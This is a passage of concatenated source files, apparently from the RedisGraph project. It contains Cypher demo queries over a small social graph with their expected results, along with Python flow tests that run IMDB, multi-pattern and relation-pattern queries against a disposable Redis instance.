            self.sum_and_average_age_of_straight_outta_compton_cast_query,
            self.how_many_movies_cameron_diaz_played_query,
            self.find_ten_oldest_actors_query,
            self.actors_over_85_index_scan,
            self.eighties_movies_index_scan,
            self.find_titles_starting_with_american_query
            # self.all_actors_named_tim
        ]
    
    def queries(self):
        return self.queries_info
/n/n/ndemo/social/social_queries.py/n/nimport sys
import os

sys.path.append(os.path.dirname(os.path.abspath(__file__)) + '/../../')
from demo import QueryInfo

graph_entities = QueryInfo(
    query=""""""MATCH (e) RETURN e.name, LABELS(e) as label ORDER BY label, e.name"""""",
    description='Returns each node in the graph, specifing node label.',
    max_run_time_ms=0.2,
    expected_result=[['Netherlands','country'],
                     ['Andora','country'],
                     ['Canada','country'],
                     ['China','country'],
                     ['Germany','country'],
                     ['Greece','country'],
                     ['Italy','country'],
                     ['Japan','country'],
                     ['Kazakhstan','country'],
                     ['Prague','country'],
                     ['Russia','country'],
                     ['Thailand','country'],
                     ['USA','country'],
                     ['Ailon Velger','person'],
                     ['Alon Fital','person'],
                     ['Boaz Arad','person'],
                     ['Gal Derriere','person'],
                     ['Jane Chernomorin','person'],
                     ['Lucy Yanfital','person'],
                     ['Mor Yesharim','person'],
                     ['Noam Nativ','person'],
                     ['Omri Traub','person'],
                     ['Ori Laslo','person'],
                     ['Roi Lipman','person'],
                     ['Shelly Laslo Rooz','person'],
                     ['Tal Doron','person'],
                     ['Valerie Abigail Arad','person']]
)

relation_type_counts = QueryInfo(
    query=""""""MATCH ()-[e]->() RETURN TYPE(e) as relation_type, COUNT(e) as num_relations ORDER BY relation_type, num_relations"""""",
    description='Returns each relation type in the graph and its count.',
    max_run_time_ms=0.4,
    expected_result=[['friend', 13],
                     ['visited', 43]]
)

subset_of_people = QueryInfo(
    query=""""""MATCH (p:person) RETURN p.name ORDER BY p.name SKIP 3 LIMIT 5"""""",
    description='Get a subset of people.',
    max_run_time_ms=0.2,
    expected_result=[[""Gal Derriere""],
                    [""Jane Chernomorin""],
                    [""Lucy Yanfital""],
                    [""Mor Yesharim""],
                    [""Noam Nativ""]]
)

my_friends_query = QueryInfo(
    query=""""""MATCH (ME:person {name:""Roi Lipman""})-[:friend]->(f:person) 
             RETURN f.name"""""",
    description='My friends?',
    max_run_time_ms=0.2,
    expected_result=[['Tal Doron'],
                     ['Omri Traub'],
                     ['Boaz Arad'],
                     ['Ori Laslo'],
                     ['Ailon Velger'],
                     ['Alon Fital']]
)

friends_of_friends_query = QueryInfo(
    query=""""""MATCH (ME:person {name:""Roi Lipman""})-[:friend]->(:person)-[:friend]->(fof:person) 
             RETURN fof.name"""""",
    description='Friends of friends?',
    max_run_time_ms=0.2,
    expected_result=[['Valerie Abigail Arad'],
                     ['Shelly Laslo Rooz'],
                     ['Noam Nativ'],
                     ['Jane Chernomorin'],
                     ['Mor Yesharim'],
                     ['Gal Derriere'],
                     ['Lucy Yanfital']]
)

friends_of_friends_single_and_over_30_query = QueryInfo(
    query=""""""MATCH (ME:person {name:""Roi Lipman""})-[:friend]->(:person)-[:friend]->(fof:person {status:""single""})
             WHERE fof.age > 30
             RETURN fof.name, fof.age, fof.gender, fof.status"""""",
    description='Friends of friends who are single and over 30?',
    max_run_time_ms=0.25,
    expected_result=[['Noam Nativ', 34, 'male', 'single']]
)

friends_of_friends_visited_netherlands_and_single_query = QueryInfo(
    query=""""""MATCH (ME:person {name:""Roi Lipman""})-[:friend]->(:person)-[:friend]->
             (fof:person {status:""single""})-[:visited]->(:country {name:""Netherlands""})
             RETURN fof.name"""""",
    description='Friends of friends who visited Netherlands and are single?',
    max_run_time_ms=0.3,
    expected_result=[['Noam Nativ'],
                     ['Gal Derriere']]
)

friends_visited_same_places_as_me_query = QueryInfo(
    query=""""""MATCH (ME:person {name:""Roi Lipman""})-[:visited]->(c:country)<-[:visited]-(f:person)<-[:friend]-(ME)
             RETURN f.name, c.name"""""",
    description='Friends who have been to places I have visited?',
    max_run_time_ms=0.45,
    expected_result=[['Tal Doron', 'Japan'],
                     ['Alon Fital', 'Prague'],
                     ['Tal Doron', 'USA'],
                     ['Omri Traub', 'USA'],
                     ['Boaz Arad', 'USA'],
                     ['Ori Laslo', 'USA'],
                     ['Alon Fital', 'USA']]
)

countries_visited_by_roi_tal_boaz = QueryInfo(
    query=""""""MATCH (A:person {name:""Roi Lipman""})-[:visited]->(X:country),
                   (B:person {name:""Tal Doron""})-[:visited]->(X),
                   (C:person {name:""Boaz Arad""})-[:visited]->(X)
            RETURN X.name"""""",
    description='Countries visited by Roi, Tal and Boaz.',
    max_run_time_ms=0.30,
    expected_result=[['USA']]
)

friends_older_than_me_query = QueryInfo(
    query=""""""MATCH (ME:person {name:""Roi Lipman""})-[:friend]->(f:person)
             WHERE f.age > ME.age
             RETURN f.name, f.age"""""",
    description='Friends who are older than me?',
    max_run_time_ms=0.25,
    expected_result=[['Omri Traub', 33]]
)

friends_age_difference_query = QueryInfo(
    query=""""""MATCH (ME:person {name:""Roi Lipman""})-[:friend]->(f:person)
             RETURN f.name, abs(ME.age - f.age) AS age_diff
             ORDER BY age_diff desc"""""",
    description='Age difference between me and each of my friends.',
    max_run_time_ms=0.35,
    expected_result=[['Boaz Arad', 1],
                     ['Omri Traub', 1],
                     ['Ailon Velger', 0],
                     ['Tal Doron', 0],
                     ['Ori Laslo', 0],
                     ['Alon Fital', 0]]
)

friends_who_are_older_than_average = QueryInfo(
    query=""""""MATCH (p:person)
             WITH avg(p.age) AS average_age 
             MATCH(:person)-[:friend]->(f:person) 
             WHERE f.age > average_age 
             RETURN f.name, f.age, round(f.age - average_age) AS age_diff 
             ORDER BY age_diff, f.name DESC
             LIMIT 4"""""",
    description='Friends who are older then the average age.',
    max_run_time_ms=0.35,
    expected_result=[['Noam Nativ', 34, 3.0],
                     ['Omri Traub', 33, 2.0],
                     ['Tal Doron', 32, 1.0],
                     ['Ori Laslo', 32, 1.0]]
)

how_many_countries_each_friend_visited_query = QueryInfo(
    query=""""""MATCH (ME:person {name:""Roi Lipman""})-[:friend]->(friend:person)-[:visited]->(c:country)
             RETURN friend.name, count(c.name) AS countriesVisited
             ORDER BY countriesVisited DESC
             LIMIT 10"""""",
    description='Count for each friend how many countires he or she been to?',
    max_run_time_ms=0.3,
    expected_result=[['Alon Fital', 3],
                     ['Omri Traub', 3],
                     ['Tal Doron', 3],
                     ['Ori Laslo', 3],
                     ['Boaz Arad', 2]]
)

happy_birthday_query = QueryInfo(
    query = """"""MATCH (:person {name:""Roi Lipman""})-[:friend]->(f:person)
               SET f.age = f.age + 1
               RETURN f.name, f.age order by f.name, f.age"""""",
    description='Update friends age.',
    max_run_time_ms=0.25,
    expected_result=[['Ailon Velger', 33],
                     ['Alon Fital',   33],
                     ['Boaz Arad',    32],
                     ['Omri Traub',   34],
                     ['Ori Laslo',    33],
                     ['Tal Doron',    33]]
)

friends_age_statistics_query = QueryInfo(
    query=""""""MATCH (ME:person {name:""Roi Lipman""})-[:friend]->(f:person)
             RETURN ME.name, count(f.name), sum(f.age), avg(f.age), min(f.age), max(f.age)"""""",
    description='Friends age statistics.',
    max_run_time_ms=0.2,
    expected_result=[['Roi Lipman', 6, 198.0, 33.0, 32, 34]]
)

visit_purpose_of_each_country_i_visited_query = QueryInfo(
    query=""""""MATCH (ME:person {name:""Roi Lipman""})-[v:visited]->(c:country) 
             RETURN c.name, v.purpose"""""",
    description='For each country i have been to, what was the visit purpose?',
    max_run_time_ms=0.2,
    expected_result=[['Japan', 'pleasure'],
                     ['Prague', 'pleasure'],
                     ['Prague', 'business'],
                     ['USA', 'business']]
)

who_was_on_business_trip_query = QueryInfo(
    query=""""""MATCH (p:person)-[v:visited {purpose:""business""}]->(c:country)
             RETURN p.name, v.purpose, toUpper(c.name)"""""",
    description='Find out who went on a business trip?',
    max_run_time_ms=0.3,
    expected_result=[['Boaz Arad', 'business','NETHERLANDS'],
                     ['Boaz Arad', 'business','USA'],
                     ['Ori Laslo', 'business', 'CHINA'],
                     ['Ori Laslo', 'business', 'USA'],
                     ['Jane Chernomorin', 'business', 'USA'],
                     ['Alon Fital', 'business', 'USA'],
                     ['Alon Fital', 'business', 'PRAGUE'],
                     ['Mor Yesharim', 'business', 'GERMANY'],
                     ['Gal Derriere', 'business', 'NETHERLANDS'],
                     ['Lucy Yanfital', 'business', 'USA'],
                     ['Roi Lipman', 'business', 'USA'],
                     ['Roi Lipman', 'business', 'PRAGUE'],
                     ['Tal Doron', 'business', 'USA'],
                     ['Tal Doron', 'business', 'JAPAN']]
)

number_of_vacations_per_person_query = QueryInfo(
    query=""""""MATCH (p:person)-[v:visited {purpose:""pleasure""}]->(c:country)
             RETURN p.name, count(v.purpose) AS vacations
             ORDER BY vacations DESC
             LIMIT 6"""""",
    description='Count number of vacations per person?',
    max_run_time_ms=0.5,
    expected_result=[['Noam Nativ', 3],
                     ['Shelly Laslo Rooz', 3],
                     ['Omri Traub', 3],
                     ['Lucy Yanfital', 3],
                     ['Jane Chernomorin', 3],
                     ['Alon Fital', 3]]
)

all_reachable_friends_query = QueryInfo(
    query=""""""MATCH (a:person {name:'Roi Lipman'})-[:friend*]->(b:person)
             RETURN b.name
             ORDER BY b.name"""""",
    description='Find all reachable friends',
    max_run_time_ms=0.3,
    expected_result=[['Ailon Velger'],
                     ['Alon Fital'],
                     ['Boaz Arad'],
                     ['Gal Derriere'],
                     ['Jane Chernomorin'],
                     ['Lucy Yanfital'],
                     ['Mor Yesharim'],
                     ['Noam Nativ'],
                     ['Omri Traub'],
                     ['Ori Laslo'],
                     ['Shelly Laslo Rooz'],
                     ['Tal Doron'],
                     ['Valerie Abigail Arad']]
)

all_reachable_countries_query = QueryInfo(
    query=""""""MATCH (a:person {name:'Roi Lipman'})-[*]->(c:country)
             RETURN c.name, count(c.name) AS NumPathsToCountry
             ORDER BY NumPathsToCountry DESC"""""",
    description='Find all reachable countries',
    max_run_time_ms=0.6,
    expected_result=[['USA', 14],
                     ['Netherlands', 6],
                     ['Prague', 5],
                     ['Greece', 4],
                     ['Canada', 2],
                     ['China', 2],
                     ['Andora', 2],
                     ['Germany', 2],
                     ['Japan', 2],
                     ['Russia', 1],
                     ['Italy', 1],
                     ['Thailand', 1],
                     ['Kazakhstan', 1]]
)

reachable_countries_or_people_query = QueryInfo(
    query=""""""MATCH (s:person {name:'Roi Lipman'})-[e:friend|:visited]->(t)
             RETURN s.name,TYPE(e),t.name
             ORDER BY t.name"""""",
    description='Every person or country one hop away from source node',
    max_run_time_ms=0.2,
    expected_result=[[""Roi Lipman"", ""friend"", ""Ailon Velger""],
                     [""Roi Lipman"", ""friend"", ""Alon Fital""],
                     [""Roi Lipman"", ""friend"", ""Boaz Arad""],
                     [""Roi Lipman"", ""visited"", ""Japan""],
                     [""Roi Lipman"", ""friend"", ""Omri Traub""],
                     [""Roi Lipman"", ""friend"", ""Ori Laslo""],
                     [""Roi Lipman"", ""visited"", ""Prague""],
                     [""Roi Lipman"", ""visited"", ""Prague""],
                     [""Roi Lipman"", ""friend"", ""Tal Doron""],
                     [""Roi Lipman"", ""visited"", ""USA""]]
)

all_reachable_countries_or_people_query = QueryInfo(
    query=""""""MATCH (a:person {name:'Roi Lipman'})-[:friend|:visited*]->(e)
             RETURN e.name, count(e.name) AS NumPathsToEntity
             ORDER BY NumPathsToEntity DESC"""""",
    description='Every reachable person or country from source node',
    max_run_time_ms=0.4,
    expected_result=[['USA', 14],
                     ['Netherlands', 6],
                     ['Prague', 5],
                     ['Greece', 4],
                     ['Andora', 2],
                     ['Japan', 2],
                     ['Germany', 2],
                     ['Canada', 2],
                     ['China', 2],
                     ['Ailon Velger', 1],
                     ['Alon Fital', 1],
                     ['Gal Derriere', 1],
                     ['Jane Chernomorin', 1],
                     ['Omri Traub', 1],
                     ['Boaz Arad', 1],
                     ['Noam Nativ', 1],
                     ['Shelly Laslo Rooz', 1],
                     ['Russia', 1],
                     ['Valerie Abigail Arad', 1],
                     ['Mor Yesharim', 1],
                     ['Italy', 1],
                     ['Tal Doron', 1],
                     ['Thailand', 1],
                     ['Kazakhstan', 1],
                     ['Lucy Yanfital', 1],
                     ['Ori Laslo', 1]]
)

all_reachable_entities_query = QueryInfo(
    query=""""""MATCH (a:person {name:'Roi Lipman'})-[*]->(e)
             RETURN e.name, count(e.name) AS NumPathsToEntity
             ORDER BY NumPathsToEntity DESC"""""",
    description='Find all reachable entities',
    max_run_time_ms=0.4,
    expected_result=[['USA', 14],
                     ['Netherlands', 6],
                     ['Prague', 5],
                     ['Greece', 4],
                     ['Andora', 2],
                     ['Japan', 2],
                     ['Germany', 2],
                     ['Canada', 2],
                     ['China', 2],
                     ['Ailon Velger', 1],
                     ['Alon Fital', 1],
                     ['Gal Derriere', 1],
                     ['Jane Chernomorin', 1],
                     ['Omri Traub', 1],
                     ['Boaz Arad', 1],
                     ['Noam Nativ', 1],
                     ['Shelly Laslo Rooz', 1],
                     ['Russia', 1],
                     ['Valerie Abigail Arad', 1],
                     ['Mor Yesharim', 1],
                     ['Italy', 1],
                     ['Tal Doron', 1],
                     ['Thailand', 1],
                     ['Kazakhstan', 1],
                     ['Lucy Yanfital', 1],
                     ['Ori Laslo', 1]]
)

all_reachable_people_min_2_hops_query = QueryInfo(
    query=""""""MATCH (ME:person {name:'Roi Lipman'})-[*2..]->(e:person)
             RETURN e.name
             ORDER BY e.name"""""",
    description='Find all reachable people at least 2 hops away from me',
    max_run_time_ms=0.35,
    expected_result=[['Gal Derriere'],
                     ['Jane Chernomorin'],
                     ['Lucy Yanfital'],
                     ['Mor Yesharim'],
                     ['Noam Nativ'],
                     ['Shelly Laslo Rooz'],
                     ['Valerie Abigail Arad']]
)

all_paths_leads_to_greece_query = QueryInfo(
    query=""""""MATCH (a)-[*]->(e:country {name:'Greece'})
             RETURN count(a.name) AS NumPathsToGreece"""""",
    description='Number of paths leading to Greece',
    max_run_time_ms=0.4,
    expected_result=[[10]]
)

number_of_paths_to_places_visited = QueryInfo(
    query=""""""MATCH (ME:person {name:'Roi Lipman'})-[:visited]->(c:country)<-[*]-(ME)
             RETURN c.name, count(c)
             ORDER BY c.name"""""",
    description='Count number of paths to places I have visited',
    max_run_time_ms=0.4,
    expected_result=[['Japan', 2],
                     ['Prague', 5],
                     ['USA', 14]]
)

delete_friendships_query = QueryInfo(
    query=""""""MATCH (ME:person {name:'Roi Lipman'})-[e:friend]->() DELETE e"""""",
    description='Delete frienships',
    max_run_time_ms=0.25,
    expected_result=[]
)

delete_person_query = QueryInfo(
    query=""""""MATCH (ME:person {name:'Roi Lipman'}) DELETE ME"""""",
    description='Delete myself from the graph',
    max_run_time_ms=0.2,
    expected_result=[]
)

post_delete_label_query = QueryInfo(
    query=""""""MATCH (p:person) RETURN p.name"""""",
    description='Retrieve all nodes with person label',
    max_run_time_ms=0.15,
    expected_result=[['Boaz Arad'],
                     ['Valerie Abigail Arad'],
                     ['Ori Laslo'],
                     ['Shelly Laslo Rooz'],
                     ['Ailon Velger'],
                     ['Noam Nativ'],
                     ['Jane Chernomorin'],
                     ['Alon Fital'],
                     ['Mor Yesharim'],
                     ['Gal Derriere'],
                     ['Lucy Yanfital'],
                     ['Tal Doron'],
                     ['Omri Traub']]
)

queries_info = [
    graph_entities,
    relation_type_counts,
    subset_of_people,
    my_friends_query,
    friends_of_friends_query,
    friends_of_friends_single_and_over_30_query,
    friends_of_friends_visited_netherlands_and_single_query,
    friends_visited_same_places_as_me_query,
    countries_visited_by_roi_tal_boaz,
    friends_older_than_me_query,
    friends_age_difference_query,
    friends_who_are_older_than_average,
    how_many_countries_each_friend_visited_query,    
    visit_purpose_of_each_country_i_visited_query,
    who_was_on_business_trip_query,
    number_of_vacations_per_person_query,
    all_reachable_friends_query,
    all_reachable_countries_query,
    reachable_countries_or_people_query,
    all_reachable_countries_or_people_query,
    all_reachable_entities_query,
    all_reachable_people_min_2_hops_query,
    happy_birthday_query,
    friends_age_statistics_query,
    all_paths_leads_to_greece_query,
    number_of_paths_to_places_visited,
    delete_friendships_query,
    delete_person_query,
    post_delete_label_query
]
/n/n/ntests/flow/test_imdb.py/n/nimport os
import sys
import unittest
from redisgraph import Graph

sys.path.append(os.path.dirname(os.path.abspath(__file__)) + '/../../demo/imdb/')
from disposableredis import DisposableRedis

from .reversepattern import ReversePattern
from base import FlowTestsBase
import imdb_queries
import imdb_utils

queries = None
redis_graph = None

def redis():
    return DisposableRedis(loadmodule=os.path.dirname(os.path.abspath(__file__)) + '/../../src/redisgraph.so')

class ImdbFlowTest(FlowTestsBase):
    @classmethod
    def setUpClass(cls):
        print ""ImdbFlowTest""
        global redis_graph
        global queries
        cls.r = redis()
        cls.r.start()
        redis_con = cls.r.client()
        redis_graph = Graph(imdb_utils.graph_name, redis_con)
        actors, movies = imdb_utils.populate_graph(redis_con, redis_graph)
        queries = imdb_queries.IMDBQueries(actors, movies)

    @classmethod
    def tearDownClass(cls):
        cls.r.stop()

    def assert_reversed_pattern(self, query, resultset):
        # Test reversed pattern query.
        reversed_query = ReversePattern().reverse_query_pattern(query)
        # print ""reversed_query: %s"" % reversed_query
        actual_result = redis_graph.query(reversed_query)

        # assert result set
        self.assertEqual(resultset.result_set, actual_result.result_set)

        # assert query run time
        self._assert_equalish(resultset.run_time_ms, actual_result.run_time_ms)

    def test_number_of_actors(self):
        global redis_graph
        q = queries.number_of_actors_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.number_of_actors_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.number_of_actors_query)

        # assert execution plan
        execution_plan = redis_graph.execution_plan(q)
        self.assertNotIn(""Aggregate"", execution_plan)
        self.assertNotIn(""Node By Label Scan"", execution_plan)
    
    def test_actors_played_with_nicolas_cage(self):
        global redis_graph
        q = queries.actors_played_with_nicolas_cage_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.actors_played_with_nicolas_cage_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.actors_played_with_nicolas_cage_query)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test_find_three_actors_played_with_nicolas_cage(self):
        global redis_graph
        NUM_EXPECTED_RESULTS = 3

        q = queries.find_three_actors_played_with_nicolas_cage_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_actual_results_contained_in_expected_results(
            actual_result,
            queries.find_three_actors_played_with_nicolas_cage_query,
            NUM_EXPECTED_RESULTS)

        # assert query run time
        self._assert_run_time(actual_result, queries.find_three_actors_played_with_nicolas_cage_query)
        
        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test_actors_played_in_movie_straight_outta_compton(self):
        global redis_graph
        q = queries.actors_played_in_movie_straight_outta_compton_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.actors_played_in_movie_straight_outta_compton_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.actors_played_in_movie_straight_outta_compton_query)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test_actors_over_50_that_played_in_blockbusters(self):
        global redis_graph
        q = queries.actors_over_50_that_played_in_blockbusters_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.actors_over_50_that_played_in_blockbusters_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.actors_over_50_that_played_in_blockbusters_query)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test_actors_played_in_bad_drama_or_comedy(self):
        global redis_graph
        q = queries.actors_played_in_bad_drama_or_comedy_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.actors_played_in_bad_drama_or_comedy_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.actors_played_in_bad_drama_or_comedy_query)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)
    
    def test_actors_played_in_drama_action_comedy(self):
        global redis_graph
        q = queries.actors_played_in_drama_action_comedy_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.actors_played_in_drama_action_comedy_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.actors_played_in_drama_action_comedy_query)

    def test_young_actors_played_with_cameron_diaz(self):
        global redis_graph
        q = queries.young_actors_played_with_cameron_diaz_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.young_actors_played_with_cameron_diaz_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.young_actors_played_with_cameron_diaz_query)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test_actors_played_with_cameron_diaz_and_younger_than_her(self):
        global redis_graph
        q = queries.actors_played_with_cameron_diaz_and_younger_than_her_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.actors_played_with_cameron_diaz_and_younger_than_her_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.actors_played_with_cameron_diaz_and_younger_than_her_query)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test_sum_and_average_age_of_straight_outta_compton_cast(self):
        global redis_graph
        q = queries.sum_and_average_age_of_straight_outta_compton_cast_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.sum_and_average_age_of_straight_outta_compton_cast_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.sum_and_average_age_of_straight_outta_compton_cast_query)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test_how_many_movies_cameron_diaz_played(self):
        global redis_graph
        q = queries.how_many_movies_cameron_diaz_played_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.how_many_movies_cameron_diaz_played_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.how_many_movies_cameron_diaz_played_query)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test_find_ten_oldest_actors(self):
        global redis_graph
        q = queries.find_ten_oldest_actors_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.find_ten_oldest_actors_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.find_ten_oldest_actors_query)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test_index_scan_actors_over_85(self):
        global redis_graph

        # Execute this command directly, as its response does not contain the result set that
        # 'redis_graph.query()' expects
        redis_graph.redis_con.execute_command(""GRAPH.QUERY"", redis_graph.name, ""CREATE INDEX ON :actor(age)"")
        q = queries.actors_over_85_index_scan.query
        execution_plan = redis_graph.execution_plan(q)
        self.assertIn('Index Scan', execution_plan)

        actual_result = redis_graph.query(q)

        redis_graph.redis_con.execute_command(""GRAPH.QUERY"", redis_graph.name, ""DROP INDEX ON :actor(age)"")

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.actors_over_85_index_scan)

        # assert query run time
        self._assert_run_time(actual_result, queries.actors_over_85_index_scan)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test_index_scan_eighties_movies(self):
        global redis_graph

        # Execute this command directly, as its response does not contain the result set that
        # 'redis_graph.query()' expects
        redis_graph.redis_con.execute_command(""GRAPH.QUERY"", redis_graph.name, ""CREATE INDEX ON :movie(year)"")
        q = queries.eighties_movies_index_scan.query
        execution_plan = redis_graph.execution_plan(q)
        self.assertIn('Index Scan', execution_plan)

        actual_result = redis_graph.query(q)

        redis_graph.redis_con.execute_command(""GRAPH.QUERY"", redis_graph.name, ""DROP INDEX ON :movie(year)"")

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.eighties_movies_index_scan)

        # assert query run time
        self._assert_run_time(actual_result, queries.eighties_movies_index_scan)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)

    def test_find_titles_starting_with_american(self):
        global redis_graph
        q = queries.find_titles_starting_with_american_query.query
        actual_result = redis_graph.query(q)

        # assert result set
        self._assert_only_expected_results_are_in_actual_results(
            actual_result,
            queries.find_titles_starting_with_american_query)

        # assert query run time
        self._assert_run_time(actual_result, queries.find_titles_starting_with_american_query)

        # assert reversed pattern.
        self.assert_reversed_pattern(q, actual_result)
    
    # def test_all_actors_named_tim(self):
    #     global redis_graph

    #     # Create full-text index over actor's name.
    #     redis_graph.redis_con.execute_command(""GRAPH.QUERY"", redis_graph.name, ""CALL db.idx.fulltext.createNodeIndex('actor', 'name')"")
    #     q = queries.all_actors_named_tim
    #     execution_plan = redis_graph.execution_plan(q)
    #     self.assertIn('ProcedureCall', execution_plan)

    #     actual_result = redis_graph.query(q)

    #     # assert result set
    #     self._assert_only_expected_results_are_in_actual_results(
    #         actual_result,
    #         queries.all_actors_named_tim)

    #     # assert query run time
    #     self._assert_run_time(actual_result, queries.all_actors_named_tim)

if __name__ == '__main__':
    unittest.main()
/n/n/ntests/flow/test_multi_pattern.py/n/nimport os
import sys
import unittest
from redisgraph import Graph, Node, Edge

# import redis
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
from disposableredis import DisposableRedis

from base import FlowTestsBase

redis_graph = None
people = [""Roi"", ""Alon"", ""Ailon"", ""Boaz"", ""Tal"", ""Omri"", ""Ori""]

def redis():
    return DisposableRedis(loadmodule=os.path.dirname(os.path.abspath(__file__)) + '/../../src/redisgraph.so')

class GraphMultiPatternQueryFlowTest(FlowTestsBase):
    @classmethod
    def setUpClass(cls):
        print ""GraphMultiPatternQueryFlowTest""
        global redis_graph
        cls.r = redis()
        cls.r.start()
        redis_con = cls.r.client()
        redis_graph = Graph(""G"", redis_con)

        # cls.r = redis.Redis()
        # redis_graph = Graph(""G"", cls.r)

        cls.populate_graph()

    @classmethod
    def tearDownClass(cls):
        cls.r.stop()
        # pass

    @classmethod
    def populate_graph(cls):
        global redis_graph
        
        nodes = {}
         # Create entities        
        for p in people:
            node = Node(label=""person"", properties={""name"": p})
            redis_graph.add_node(node)
            nodes[p] = node

        redis_graph.commit()

    # Connect a single node to all other nodes.
    def test01_connect_node_to_rest(self):
        query = """"""MATCH(r:person {name:""Roi""}), (f:person) WHERE f.name != r.name CREATE (r)-[:friend]->(f) RETURN count(f)""""""
        actual_result = redis_graph.query(query)
        friend_count = actual_result.result_set[0][0]
        assert(friend_count == 6)
        assert (actual_result.relationships_created == 6)

    def test02_verify_cartesian_product_streams_reset(self):
        # See https://github.com/RedisGraph/RedisGraph/issues/249
        # Forevery outgoing edge, we expect len(people) to be matched.
        expected_resultset_size = 6 * len(people)
        queries = [""""""MATCH (r:person {name:""Roi""})-[]->(f), (x) RETURN f, x"""""",
                   """"""MATCH (x), (r:person {name:""Roi""})-[]->(f) RETURN f, x"""""",
                   """"""MATCH (r:person {name:""Roi""})-[]->(f) MATCH (x) RETURN f, x"""""",
                   """"""MATCH (x) MATCH (r:person {name:""Roi""})-[]->(f) RETURN f, x""""""]
        for q in queries:
            actual_result = redis_graph.query(q)
            records_count = len(actual_result.result_set)
            assert(records_count == expected_resultset_size)

    # Connect every node to every node.
    def test03_create_fully_connected_graph(self):
        query = """"""MATCH(a:person), (b:person) WHERE a.name != b.name CREATE (a)-[f:friend]->(b) RETURN count(f)""""""
        actual_result = redis_graph.query(query)
        friend_count = actual_result.result_set[0][0]
        assert(friend_count == 42)
        assert (actual_result.relationships_created == 42)
    
    # Perform a cartesian product of 3 sets.
    def test04_cartesian_product(self):
        queries = [""""""MATCH (a), (b), (c) RETURN count(a)"""""",
                   """"""MATCH (a) MATCH (b), (c) RETURN count(a)"""""",
                   """"""MATCH (a), (b) MATCH (c) RETURN count(a)"""""",
                   """"""MATCH (a) MATCH (b) MATCH (c) RETURN count(a)""""""]

        for q in queries:
            actual_result = redis_graph.query(q)
            friend_count = actual_result.result_set[0][0]
            assert(friend_count == 343)

    def test06_multiple_create_clauses(self):
        queries = [""""""CREATE (:a {v:1}), (:b {v:2, z:3}), (:c), (:a)-[:r0 {k:9}]->(:b), (:c)-[:r1]->(:d)"""""",
                   """"""CREATE (:a {v:1}) CREATE (:b {v:2, z:3}) CREATE (:c) CREATE (:a)-[:r0 {k:9}]->(:b) CREATE (:c)-[:r1]->(:d)"""""",
                   """"""CREATE (:a {v:1}), (:b {v:2, z:3}) CREATE (:c), (:a)-[:r0 {k:9}]->(:b) CREATE (:c)-[:r1]->(:d)""""""]
        for q in queries:
            actual_result = redis_graph.query(q)
            assert (actual_result.relationships_created == 2)
            assert (actual_result.properties_set == 4)
            assert (actual_result.nodes_created == 7)

if __name__ == '__main__':
    unittest.main()
/n/n/ntests/flow/test_relation_patterns.py/n/nimport os
import sys
import unittest
from redisgraph import Graph, Node, Edge

# import redis
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
from disposableredis import DisposableRedis

from base import FlowTestsBase

redis_graph = None

GRAPH_ID = ""G""

def redis():
    return DisposableRedis(loadmodule=os.path.dirname(os.path.abspath(__file__)) + '/../../src/redisgraph.so')

class RelationPatternTest(FlowTestsBase):
    @classmethod
    def setUpClass(cls):
        print ""RelationPatternTest""
        global redis_graph
        cls.r = redis()
        cls.r.start()
        redis_con = cls.r.client()
        redis_graph = Graph(GRAPH_ID, redis_con)

        cls.populate_graph()

    @classmethod
    def tearDownClass(cls):
        cls.r.stop()
        # pass

    @classmethod
    def populate_graph(cls):
        # Construct a graph with the form:
        # (v1)-[:e]->(v2)-[:e]->(v3)
        node_props = ['v1', 'v2', 'v3']

        nodes = []
